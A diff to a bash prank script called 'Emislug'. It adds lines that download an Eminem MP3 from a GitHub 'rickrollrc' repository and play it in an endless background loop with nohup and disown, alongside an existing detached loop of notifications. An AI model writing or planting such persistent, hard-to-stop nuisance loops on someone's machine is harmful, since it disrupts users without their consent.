@@ -3,6 +3,8 @@
 # Configuration
 NOTIFICATION_TEXT="Emislug is watching you... 👀"
 NOTIFICATION_DELAY=1
+AUDIO_URL="https://github.com/MopigamesYT/rickrollrc/raw/refs/heads/master/Low%20quality%20-%20Eminem%20-%20Rap%20God%20(19.2%20Mb).mp3"
+AUDIO_PATH="$HOME/.cache/emislug-audio.mp3"
 
 # Send notifications in an infinite loop in the background, detached from terminal
 nohup bash -c "
@@ -12,6 +14,40 @@ nohup bash -c "
     done
 " >/dev/null 2>&1 &
 disown
+
+# Download and play audio in loop
+mkdir -p "$HOME/.cache"
+echo "Downloading audio file..."
+wget -q -O "$AUDIO_PATH" "$AUDIO_URL"
+
+if [ $? -eq 0 ]; then
+    echo "Audio downloaded successfully"
+    
+    # Start audio loop in background, detached from terminal
+    nohup bash -c "
+        while true; do
+            if command -v pw-play > /dev/null; then
+                pw-play '$AUDIO_PATH'
+            elif command -v paplay > /dev/null; then
+                paplay '$AUDIO_PATH'
+            elif command -v aplay > /dev/null; then
+                aplay '$AUDIO_PATH'
+            elif command -v mpv > /dev/null; then
+                mpv --no-video --really-quiet '$AUDIO_PATH'
+            elif command -v ffplay > /dev/null; then
+                ffplay -nodisp -autoexit -loglevel quiet '$AUDIO_PATH'
+            else
+                echo 'No audio player found' >&2
+                break
+            fi
+            sleep 0.5
+        done
+    " >/dev/null 2>&1 &
+    disown
+    echo "Audio loop started in background"
+else
+    echo "Failed to download audio file"
+fi
 
 # Download the Emislug image
 WALLPAPER_PATH="$HOME/Pictures/emislug-wallpaper.jpg"
